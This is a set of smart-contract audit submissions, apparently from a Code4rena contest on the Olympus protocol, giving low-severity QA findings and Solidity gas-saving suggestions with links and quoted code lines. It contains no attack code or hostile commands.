- **Finding**: Constructor parameter are not validated     **Severity:** QA     **Description:**     Constructor parameters are not validated at:     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L77     To mitigate the risk of misconfiguration, it's recommended to validate `tokens_` and `rangeParams_` parameters     (the former is used to set immutable variables, which cannot be modified after being set incorrectly in constructor).  - **Finding**: Misconfiguration risk due to usage of arrays to pass function arguments     **Severity:** QA     **Description:**     The usage of arrays when passing multiple arguments to functions can cause misconfiguration issues because deployer/     user has to ensure the order of array elements is correct when calling a function. It's recommended to use parameters     structures in these cases:     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L79-L80         For `tokens_` and `rangeParams_`. Passing tokens in a wrong order might result in an unusable contract.     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L96-L97         For `tokens_` and `configParams`. Passing tokens in a wrong order might result in an unusable contract. `configParams` contains many values that are hard to read/track in the code since they're referenced by their index in the array, not their name.      Poor readability of array arguments forced developers to add the comments with argument names and their order.      An example of a parameters structure:     - https://github.com/Uniswap/v3-periphery/blob/main/contracts/NonfungiblePositionManager.sol#L128     - https://github.com/Uniswap/v3-periphery/blob/75f3b72b4412b41e31c2a2370bb52d55f99ec717/contracts/interfaces/INonfungiblePositionManager.sol#L79-L91  - **Finding**: Poor validation of "debt buffer" arguments     **Severity:** QA     **Description:**     These function arguments are not validated according to the documentation:     - `cushionDebtBuffer` at https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L97     - `debtBuffer_` at https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L527          In both of these cases, the passed value is checked to be lower than `10000`, however, in [MarketParams     documentation in IBondAuctioneer](https://github.com/code-423n4/2022-08-olympus/blob/main/src/interfaces/IBondAuctioneer.sol#L31-L35):     > Minimum is the greater of 10% or initial max payout as a percentage of capacity.     > The value must be > 10% but can exceed 100% if desired.      Also, the documentation says:     > If the value is too small, the market will not be able function normally and close prematurely.      However, there's no minimal value check in the above functions.  - **Finding**: Unused function     **Severity:** QA     **Description:**     `fromRole` in `KernelUtils.sol` is not used:     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L26
-> X = X + Y IS CHEAPER THAN X += Y (same for X = X - Y IS CHEAPER THAN X -= Y)  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#:~:text=reserveDebt%5Btoken_%5D%5Bmsg.sender%5D%20%2B%3D%20amount_%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#:~:text=totalDebt%5Btoken_%5D%20%2B%3D%20amount_%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#:~:text=reserveDebt%5Btoken_%5D%5Bmsg.sender%5D%20%2D%3D%20received%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#:~:text=totalDebt%5Btoken_%5D%20%2D%3D%20received%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#:~:text=oldDebt%20%3C%20amount_)-,totalDebt%5Btoken_%5D%20%2B%3D%20amount_,-%2D%20oldDebt%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#:~:text=totalDebt%5Btoken_%5D%20%2D%3D%20oldDebt https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#:~:text=_movingAverage%20%2B%3D%20(currentPrice%20%2D%20earliestPrice)%20/%20numObs%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#:~:text=_movingAverage%20%2D%3D%20(earliestPrice%20%2D%20currentPrice)%20/%20numObs%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#:~:text=total%20%2B%3D%20startObservations_%5Bi%5D%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#:~:text=balanceOf%5Bfrom_%5D%20%2D%3D%20amount_%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#:~:text=balanceOf%5Bto_%5D%20%2B%3D%20amount_%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#:~:text=_amountsPerMarket%5Bid_%5D%5B0%5D%20%2B%3D%20inputAmount_%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#:~:text=_amountsPerMarket%5Bid_%5D%5B1%5D%20%2B%3D%20outputAmount_%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#:~:text=lastBeat%20%2B%3D%20frequency()%3B   ->STATE VARIABLES ONLY SET IN THE CONSTRUCTOR SHOULD BE DECLARED IMMUTABLE  Avoids a Gsset (20000 gas) in the constructor, and replaces each Gwarmacces (100 gas) with a PUSH32 (3 gas)  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#:~:text=uint256%20internal%20immutable%20_scaleFactor%3B  -> ++i costs less gas compared to i++ or i += 1 (Also --i costs less gas compared to i-- or i -= 1)  https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#:~:text=A%2DZ%20only-,unchecked%20%7B,i%2B%2B%3B,-%7D https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#:~:text=%7D-,unchecked%20%7B,i%2B%2B%3B,-%7D https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=/%2010%3B-,decimals%2B%2B,-%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=%3D%20true%3B-,_status.low.count%2B%2B,-%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=%3D%20false%3B-,_status.low.count%2D%2D,-%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=_status.high.count%2B%2B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=_status.high.count%2D%2D   -> USAGE OF UINTS/INTS SMALLER THAN 32 BYTES (256 BITS) INCURS OVERHEAD When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#:~:text=%3D%3E%20mapping(-,bytes4,-%3D%3E%20bool))) https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#:~:text=)%20pure%20returns-,(bytes5),-%7B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#:~:text=override%20returns%20(-,uint8%20major%2C,-uint8%20minor)%20%7B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#:~:text=uint8%20major%2C-,uint8%20minor),-%7B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#:~:text=by%20the%20contract.-,uint8,-public%20constant%20decimals https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#:~:text=_ohmEthPriceFeed%20%3D%20ohmEthPriceFeed_%3B-,uint8,-ohmEthDecimals%20%3D%20_ohmEthPriceFeed https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#:~:text=override%20returns%20(-,uint8%20major,-%2C%20uint8%20minor https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#:~:text=uint8%20major%2C-,uint8%20minor),-%7B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=public%20immutable%20ohm%3B-,uint8,-public%20immutable%20ohmDecimals https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=public%20immutable%20reserve%3B-,uint8,-public%20immutable%20reserveDecimals https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=is%20the%20priceDecimal%20value-,int8,-priceDecimals%20%3D%20_getPriceDecimals(range https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=cushion.high.price)%3B-,int8,-scaleAdjustment%20%3D%20int8 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=int8%20scaleAdjustment%20%3D-,int8,-(ohmDecimals)%20%2D https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=(ohmDecimals)%20%2D-,int8,-(reserveDecimals)%20%2B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=uint256%20bondScale%20%3D%2010%20**-,uint8(,-36%20%2B%20scaleAdjustment%20%2B%20int8(reserveDecimals https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=the%20low%20side-,uint8,-oracleDecimals%20%3D%20PRICE https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=is%20the%20priceDecimal%20value-,int8,-priceDecimals%20%3D%20_getPriceDecimals(invCushionPrice https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=_getPriceDecimals(invCushionPrice)%3B-,int8,-scaleAdjustment%20%3D%20int8 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=int8%20scaleAdjustment%20%3D-,int8,-(reserveDecimals)%20%2D https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=(reserveDecimals)%20%2D-,int8,-(ohmDecimals)%20%2B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=%3D%2010**-,uint8,-(int8(oracleDecimals https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=**uint8(-,int8,-(oracleDecimals)%20%2D https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=%2B%20scaleAdjustment%20%2B-,int8,-(ohmDecimals)%20%2D https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=(ohmDecimals)%20%2D-,int8,-(reserveDecimals)%20%2D https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=return%20decimals%20%2D-,int8,-(PRICE.decimals   ->IT COSTS MORE GAS TO INITIALIZE NON-CONSTANT/NON-IMMUTABLE VARIABLES TO ZERO THAN TO LET THE DEFAULT OF ZERO BE APPLIED  https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#:~:text=for%20(-,uint256%20i%20%3D%200%3B,-i%20%3C%205 https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#:~:text=for-,(uint256%20i%20%3D%200,-%3B%20i%20%3C%2032   ->USING BOOLS FOR STORAGE INCURS OVERHEAD  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#:~:text=mapping(bytes4%20%3D%3E%20bool))) https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#:~:text=mapping(Role%20%3D%3E%20bool)) https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#:~:text=if%20role%20exists.-,mapping(Role%20%3D%3E%20bool),-public%20isRole%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#:~:text=and%20therefore%20active).-,bool,-public%20initialized%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=bool%20public%20initialized%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=Operator%20is%20active-,bool%20public%20active%3B,-///%20Modules https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#:~:text=mapping(uint256%20%3D%3E%20bool) https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#:~:text=stopped%2C%20true%20%3D%20beating-,bool%20public%20active%3B,-///%20%40notice%20Timestamp%20of https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#:~:text=mapping(address%20%3D%3E%20bool)  
**Kernel.sol** - L70/88/119/223/229 - Gas can be saved if instead of using a modifier a private view function is used, this would reduce all the costs of validating the access control of an address.  - L397 - When you want to set a variable with its default value, it is less expensive not to set it since it has that default value, this reduces some gas units without losing understanding of the code.  **KernelUtils.sol** - L43/58 - When you want to set a variable with its default value, it is less expensive not to set it since it has that default value, this reduces some gas units without losing understanding of the code.  - L49/64 - It is less expensive to do the ++i operation than to do i++, without losing understanding of the code.  **TRSRY.sol** - L131/132 - When previously it is validated that the operation returns a value without overflow/underflow, it can be wrapped with unchecked in order to spend less gas when performing the mathematical operation. What could be unchecked is the operation, not the validation of the if.  **PRICE.sol** - L6 - The ERC20 class is imported, but it is never used, this generates unnecessary extra gas costs.  - L136/138 - When it is previously validated that the operation returns a value without overflow/underflow, it can be wrapped with unchecked in order to spend less gas when performing the mathematical operation. What could be unchecked is the operation, not the validation of the if.  **BondCallback.sol** - L120 - It is necessary to validate that outputAmount_ > inputAmount_ so that it does not throw an exception without any underflow message. In addition, the outputAmount_ - inputAmount_ operation can become unchecked so that what has already been validated is not validated.  - L223/306 - Instead of validating "validation == true" or "validation == false" it is much simpler and less expensive to validate "validation" or "!validation".  - L278 - In a for loop instead of consulting the length of the array to be iterated in each iteration, the least expensive thing is to create a variable in memory of the value of array.length  **RANGE.sol** - L133/145 - It is less expensive in a validation that the less expensive operation is ahead, since it avoids executing the second more expensive validation.  **Heart.sun** - L26 - an error is created that is not used anywhere, it should be eliminated.   **TreasuryCustodian.sol** - L11 - an error is created that is not used anywhere, it should be eliminated.   **Operator.sol** - L188 - The modifier can generate much less gas cost, if instead of a modifier it were a private view function.  - L488/670/675 - It is less expensive to make ++variable than to make variable++, without modifying the understanding of the code. 
# [G-01] **tate variables only set in the constructor should be declared `immutable`** (Avoids a Gsset (20000 gas)):    1. File: 2022-08-olympus/src/Kernel.sol (line 155-158):     `    address public executor;      /// @notice Address that is responsible for assigning policy-defined roles to addresses.     address public admin;`  2. File: 2022-08-olympus/src/Kernel.sol (line 188):     `Policy[] public activePolicies;`  3. File: 2022-08-olympus/src/modules/PRICE.sol (line 41-56):     `    uint256[] public observations;      /// @notice Index of the next observation to make. The current value at this index is the oldest observation.     uint32 public nextObsIndex;      /// @notice Number of observations used in the moving average calculation. Computed from movingAverageDuration / observationFrequency.     uint32 public numObservations;      /// @notice Frequency (in seconds) that observations should be stored.     uint48 public observationFrequency;      /// @notice Duration (in seconds) over which the moving average is calculated.     uint48 public movingAverageDuration;      /// @notice Unix timestamp of last observation (in seconds).     uint48 public lastObservationTime;`  4. File: 2022-08-olympus/src/modules/INSTR.sol (line 13):     `uint256 public totalInstructions;`         5. File: 2022-08-olympus/src/policies/Operator.sol (line 76-78):     `   IBondAuctioneer public auctioneer;     /// @notice     Callback contract used for cushion bond market payouts     IBondCallback public callback;`  6. File: 2022-08-olympus/src/policies/BondCallback.sol (line 28-32):     `    IBondAggregator public aggregator;     OlympusTreasury public TRSRY;     OlympusMinter public MINTR;     Operator public operator;     ERC20 public ohm;`  7. File: 2022-08-olympus/src/policies/Heart.sol (line 36-42):     `    uint256 public lastBeat;      /// @notice Reward for beating the Heart (in reward token decimals)     uint256 public reward;      /// @notice Reward token address that users are sent for beating the Heart     ERC20 public rewardToken;`      8. File: 2022-08-olympus/src/policies/VoterRegistration.sol (line 10):     `OlympusVotes public VOTES;`          # [G-02] `x = x + y` is cheaper than `x += y`:    1. File: 2022-08-olympus/src/modules/TRSRY.sol (line 115-116):     `        reserveDebt[token_][msg.sender] -= received;         totalDebt[token_] -= received;`  2. File: 2022-08-olympus/src/modules/TRSRY.sol (line 132):     `else totalDebt[token_] -= oldDebt - amount_;`  3. File: 2022-08-olympus/src/modules/PRICE.sol (line 138):     `_movingAverage -= (earliestPrice - currentPrice) / numObs;`  4. File: 2022-08-olympus/src/modules/VOTES.sol (line 56):     `balanceOf[from_] -= amount_;`         5. File: 2022-08-olympus/src/policies/Governance.sol (line 194):     `totalEndorsementsForProposal[proposalId_] -= previousEndorsement;`  6. File: 2022-08-olympus/src/policies/BondCallback.sol (line 28-32):     `    IBondAggregator public aggregator;     OlympusTreasury public TRSRY;     OlympusMinter public MINTR;     Operator public operator;     ERC20 public ohm;`  7. File: 2022-08-olympus/src/modules/TRSRY.sol (line 96-97):     `        reserveDebt[token_][msg.sender] += amount_;         totalDebt[token_] += amount_;`  8. File: 2022-08-olympus/src/modules/TRSRY.sol (line 131):     `if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;`   9. File: 2022-08-olympus/src/modules/PRICE.sol (line 136):     `_movingAverage += (currentPrice - earliestPrice) / numObs;`  10. File: 2022-08-olympus/src/modules/PRICE.sol (line 222):     `total += startObservations_[i];`   11. File: 2022-08-olympus/src/modules/VOTES.sol (line 58):     `balanceOf[to_] += amount_;`  12. File: 2022-08-olympus/src/policies/BondCallback.sol (line 143-144):     `        _amountsPerMarket[id_][0] += inputAmount_;         _amountsPerMarket[id_][1] += outputAmount_;`  13. File: 2022-08-olympus/src/policies/Heart.sol (line 103):     `lastBeat += frequency();`   14. File: 2022-08-olympus/src/policies/Governance.sol (line 198):     `totalEndorsementsForProposal[proposalId_] += userVotes;`  15. File: 2022-08-olympus/src/policies/Governance.sol 252-254):     `            yesVotesForProposal[activeProposal.proposalId] += userVotes;         } else {             noVotesForProposal[activeProposal.proposalId] += userVotes;`                                                # [G-03] `<array>.length` should not be looked up in every loop of a `for` loop:    1. File: 2022-08-olympus/src/policies/Governance.sol (line 278):     `for (uint256 step; step < instructions.length; ) {`               # [G-04] Not using the named return variables when a function returns, wastes deployment gas:    1. File: 2022-08-olympus/src/modules/RANGE.sol (line 276):     `return _range;`  2. File: 2022-08-olympus/src/policies/Operator.sol (line 784):     `return _status;`  3. File: 2022-08-olympus/src/policies/Operator.sol (line 799):     ` return _config;`         # [G-05] It costs more gas to initialize variables to zero than to let the default of zero be applied:    1. File: 2022-08-olympus/src/Kernel.sol (line 276):     `for (uint256 i = 0; i < reqLength; ) {`  2. File: 2022-08-olympus/src/utils/KernelUtils.sol (line 58):     `for (uint256 i = 0; i < 32; ) {`  3. File: 2022-08-olympus/src/utils/KernelUtils.sol (line 43):     `for (uint256 i = 0; i < 5; ) {`  4. File: 2022-08-olympus/src/modules/PRICE.sol (line 253-255):     `        lastObservationTime = 0;         _movingAverage = 0;         nextObsIndex = 0;`         5. File: 2022-08-olympus/src/modules/PRICE.sol (line 285-287):     `        lastObservationTime = 0;         _movingAverage = 0;         nextObsIndex = 0;`  6. File: 2022-08-olympus/src/policies/Operator.sol(line 574-575):     `        _status.high.count = 0;         _status.high.nextObservation = 0;`   7. File: 2022-08-olympus/src/policies/Operator.sol (line 578-579):     `        _status.low.count = 0;         _status.low.nextObservation = 0;`           # [G-06] Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead (> When using elements that are smaller than 32 bytes, your  contract’s gas usage may be higher. This is because the EVM operates on  32 bytes at a time. Therefore, if the element is smaller than that, the  EVM must use more operations in order to reduce the size of the element  from 32 bytes to the desired size. >   [https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html](https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html) Use a larger size then downcast where needed):    1. File: 2022-08-olympus/src/Kernel.sol (line 100):     `function VERSION() external pure virtual returns (uint8 major, uint8 minor) {}`  2. File: 2022-08-olympus/src/modules/TRSRY.sol (line 51):     `function VERSION() external pure override returns (uint8 major, uint8 minor) {`  3. File: 2022-08-olympus/src/modules/MINTR.sol (line 25):     `function VERSION() external pure override returns (uint8 major, uint8 minor) {`  4. File: 2022-08-olympus/src/modules/RANGE.sol (line 45):     `uint48 lastActive;`         5. File: 2022-08-olympus/src/modules/RANGE.sol (line 115):     `function VERSION() external pure override returns (uint8 major, uint8 minor) {`  6. File: 2022-08-olympus/src/modules/RANGE.sol(line 136):     `_range.high.lastActive = uint48(block.timestamp);`   7. File: 2022-08-olympus/src/modules/RANGE.sol (line 148):     `_range.low.lastActive = uint48(block.timestamp);`      8. File: 2022-08-olympus/src/modules/PRICE.sol (line 27-28):     `    event MovingAverageDurationChanged(uint48 movingAverageDuration_);     event ObservationFrequencyChanged(uint48 observationFrequency_);`         9. File: 2022-08-olympus/src/modules/PRICE.sol (line 44-59):     ` uint32 public nextObsIndex;      /// @notice Number of observations used in the moving average calculation. Computed from movingAverageDuration / observationFrequency.     uint32 public numObservations;      /// @notice Frequency (in seconds) that observations should be stored.     uint48 public observationFrequency;      /// @notice Duration (in seconds) over which the moving average is calculated.     uint48 public movingAverageDuration;      /// @notice Unix timestamp of last observation (in seconds).     uint48 public lastObservationTime;      /// @notice Number of decimals in the price values provided by the contract.     uint8 public constant decimals = 18;`  10. File: 2022-08-olympus/src/policies/Operator.sol(line 75-76):     `        uint48 observationFrequency_,         uint48 movingAverageDuration_`   11. File: 2022-08-olympus/src/policies/Operator.sol (line 84):     `uint8 ohmEthDecimals = _ohmEthPriceFeed.decimals();`  12. File: 2022-08-olympus/src/modules/PRICE.sol (line 87):     `uint8 reserveEthDecimals = _reserveEthPriceFeed.decimals();`  13. File: 2022-08-olympus/src/modules/PRICE.sol (line 97):     `numObservations = uint32(movingAverageDuration_ / observationFrequency_);`  14. File: 2022-08-olympus/src/modules/PRICE.sol (line 113):     `function VERSION() external pure override returns (uint8 major, uint8 minor) {`   15. File: 2022-08-olympus/src/modules/PRICE.sol (line 127):     `uint32 numObs = numObservations;`  16. File: 2022-08-olympus/src/modules/PRICE.sol (line 143):     `lastObservationTime = uint48(block.timestamp);`    17. File: 2022-08-olympus/src/modules/PRICE.sol (line 185):     `uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1;`  18. File: 2022-08-olympus/src/modules/PRICE.sol (line 215):     `if (startObservations_.length != numObs || lastObservationTime_ > uint48(block.timestamp))`  19. File: 2022-08-olympus/src/modules/PRICE.sol (line 240):     `function changeMovingAverageDuration(uint48 movingAverageDuration_) external permissioned {`  20. File: 2022-08-olympus/src/modules/PRICE.sol (line 257):     `numObservations = uint32(newObservations);`  21. File: 2022-08-olympus/src/modules/PRICE.sol (line 266):     `function changeObservationFrequency(uint48 observationFrequency_) external permissioned {`  22. File: 2022-08-olympus/src/modules/PRICE.sol (line 289):     `numObservations = uint32(newObservations);`  23. 2022-08-olympus/src/modules/VOTES.sol (line 27):     `function VERSION() external pure override returns (uint8 major, uint8 minor) {`  24. 2022-08-olympus/src/modules/INSTR.sol (line 28):     `function VERSION() public pure override returns (uint8 major, uint8 minor) {`  25. 2022-08-olympus/src/policies/Operator.sol (line 51-54):     `    event CushionFactorChanged(uint32 cushionFactor_);     event CushionParamsChanged(uint32 duration_, uint32 debtBuffer_, uint32 depositInterval_);     event ReserveFactorChanged(uint32 reserveFactor_);     event RegenParamsChanged(uint32 wait_, uint32 threshold_, uint32 observe_);`  26. 2022-08-olympus/src/policies/Operator.sol (line 83):     `uint8 public immutable ohmDecimals;`  27. 2022-08-olympus/src/policies/Operator.sol (line 86-89):     `    uint8 public immutable reserveDecimals;      /// Constants     uint32 public constant FACTOR_SCALE = 1e4;`  28. 2022-08-olympus/src/policies/Operator.sol (line 51-54):     `uint32[8] memory configParams`  29. 2022-08-olympus/src/policies/Operator.sol (line 106-108):     `        if (configParams[2] < uint32(10_000)) revert Operator_InvalidParams();          if (configParams[3] < uint32(1 hours) || configParams[3] > configParams[1])`  30. 2022-08-olympus/src/policies/Operator.sol (line 116):     `configParams[7] == uint32(0)`  31. 2022-08-olympus/src/policies/Operator.sol (line 127-129):     `            count: uint32(0),             lastRegen: uint48(block.timestamp),             nextObservation: uint32(0),`  32. 2022-08-olympus/src/policies/Operator.sol (line 210):     `uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&`  33. 2022-08-olympus/src/policies/Operator.sol (line 216):     `uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&`  34. 2022-08-olympus/src/policies/Operator.sol (line 403-404):     `                vesting: uint48(0), // Instant swaps                 conclusion: uint48(block.timestamp + config_.cushionDuration),`  35. 2022-08-olympus/src/policies/Operator.sol (line 418):     `uint8 oracleDecimals = PRICE.decimals();`  36. 2022-08-olympus/src/policies/Operator.sol (line 455-456):     `                vesting: uint48(0), // Instant swaps                 conclusion: uint48(block.timestamp + config_.cushionDuration),`   37. 2022-08-olympus/src/policies/Operator.sol (line 516):     `function setCushionFactor(uint32 cushionFactor_) external onlyRole("operator_policy") {`  38. 2022-08-olympus/src/policies/Operator.sol (line 528-530):     `        uint32 duration_,         uint32 debtBuffer_,         uint32 depositInterval_`   39. 2022-08-olympus/src/policies/Operator.sol (line 535-536):     `        if (debtBuffer_ < uint32(10_000)) revert Operator_InvalidParams();         if (depositInterval_ < uint32(1 hours) || depositInterval_ > duration_)`  40. 2022-08-olympus/src/policies/Operator.sol (line 548):     `function setReserveFactor(uint32 reserveFactor_) external onlyRole("operator_policy") {`  41. 2022-08-olympus/src/policies/Operator.sol (line 560-562):     `        uint32 wait_,         uint32 threshold_,         uint32 observe_`  42. 2022-08-olympus/src/policies/Operator.sol (line 665):     `uint32 observe = _config.regenObserve;`  43. 2022-08-olympus/src/policies/Operator.sol (line 560-562):     `        uint32 wait_,         uint32 threshold_,         uint32 observe_`  44. 2022-08-olympus/src/policies/Operator.sol (line 705):     `_status.high.count = uint32(0);`   45. 2022-08-olympus/src/policies/Operator.sol (line 707-708):     `            _status.high.nextObservation = uint32(0);             _status.high.lastRegen = uint48(block.timestamp);`  46. 2022-08-olympus/src/policies/Operator.sol (line 717):     `_status.low.count = uint32(0);`   47. 2022-08-olympus/src/policies/Operator.sol (line 719-720):     `            _status.low.nextObservation = uint32(0);             _status.low.lastRegen = uint48(block.timestamp);`   48. 2022-08-olympus/src/policies/PriceConfig.sol (line 58):     `function changeMovingAverageDuration(uint48 movingAverageDuration_)`   49. 2022-08-olympus/src/policies/PriceConfig.sol (line 69):     `function changeObservationFrequency(uint48 observationFrequency_)`  50. 2022-08-olympus/src/policies/interfaces/IOperator.sol (line 13-20):     `        uint32 cushionFactor; // percent of capacity to be used for a single cushion deployment, assumes 2 decimals (i.e. 1000 = 10%)         uint32 cushionDuration; // duration of a single cushion deployment in seconds         uint32 cushionDebtBuffer; // Percentage over the initial debt to allow the market to accumulate at any one time. Percent with 3 decimals, e.g. 1_000 = 1 %. See IBondAuctioneer for more info.         uint32 cushionDepositInterval; // Target frequency of deposits. Determines max payout of the bond market. See IBondAuctioneer for more info.         uint32 reserveFactor; // percent of reserves in treasury to be used for a single wall, assumes 2 decimals (i.e. 1000 = 10%)         uint32 regenWait; // minimum duration to wait to reinstate a wall in seconds         uint32 regenThreshold; // number of price points on other side of moving average to reinstate a wall         uint32 regenObserve; // number of price points to observe to determine regeneration`   51. 2022-08-olympus/src/policies/interfaces/IOperator.sol (line 31-33):     `        uint32 count; // current number of price points that count towards regeneration         uint48 lastRegen; // timestamp of the last regeneration         uint32 nextObservation; // index of the next observation in the observations array`  52. 2022-08-olympus/src/policies/interfaces/IOperator.sol (line 93-95):     `       uint32 duration_,         uint32 debtBuffer_,         uint32 depositInterval_`   53. 2022-08-olympus/src/policies/interfaces/IOperator.sol (line 101):     `function setReserveFactor(uint32 reserveFactor_) external;`   54. 2022-08-olympus/src/policies/interfaces/IOperator.sol (line 110-112):     `       uint32 wait_,         uint32 threshold_,         uint32 observe_`                                                                                                                                              # [G-06] Functions guaranteed to revert when called by normal users can be marked `payable` (If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided.):    1. File: 2022-08-olympus/src/policies/TreasuryCustodian.sol (line 42-46):     `   function grantApproval(         address for_,         ERC20 token_,         uint256 amount_     ) external onlyRole("custodian") {`  2. File: 2022-08-olympus/src/policies/TreasuryCustodian.sol (line 71-75):     `    function increaseDebt(         ERC20 token_,         address debtor_,         uint256 amount_     ) external onlyRole("custodian") {`  3. File: 2022-08-olympus/src/policies/TreasuryCustodian.sol (line 80-85):     `    function decreaseDebt(         ERC20 token_,         address debtor_,         uint256 amount_     ) external onlyRole("custodian") {`  4. File: 2022-08-olympus/src/policies/Operator.sol (line 195):     `function operate() external override onlyWhileActive onlyRole("operator_operate") {`         5. File: 2022-08-olympus/src/policies/Operator.sol (line 346-350):     `function bondPurchase(uint256 id_, uint256 amountOut_)         external         onlyWhileActive         onlyRole("operator_reporter")     {`  6. File: 2022-08-olympus/src/policies/Operator.sol(line 498-624):     `     function setSpreads(uint256 cushionSpread_, uint256 wallSpread_)         external         onlyRole("operator_policy")     {         /// Set spreads on the range module         RANGE.setSpreads(cushionSpread_, wallSpread_);          /// Update range prices (wall and cushion)         _updateRangePrices();     }      /// @inheritdoc IOperator     function setThresholdFactor(uint256 thresholdFactor_) external onlyRole("operator_policy") {         /// Set threshold factor on the range module         RANGE.setThresholdFactor(thresholdFactor_);     }      /// @inheritdoc IOperator     function setCushionFactor(uint32 cushionFactor_) external onlyRole("operator_policy") {         /// Confirm factor is within allowed values         if (cushionFactor_ > 10000 || cushionFactor_ < 100) revert Operator_InvalidParams();          /// Set factor         _config.cushionFactor = cushionFactor_;          emit CushionFactorChanged(cushionFactor_);     }      /// @inheritdoc IOperator     function setCushionParams(         uint32 duration_,         uint32 debtBuffer_,         uint32 depositInterval_     ) external onlyRole("operator_policy") {         /// Confirm values are valid         if (duration_ > uint256(7 days) || duration_ < uint256(1 days))             revert Operator_InvalidParams();         if (debtBuffer_ < uint32(10_000)) revert Operator_InvalidParams();         if (depositInterval_ < uint32(1 hours) || depositInterval_ > duration_)             revert Operator_InvalidParams();          /// Update values         _config.cushionDuration = duration_;         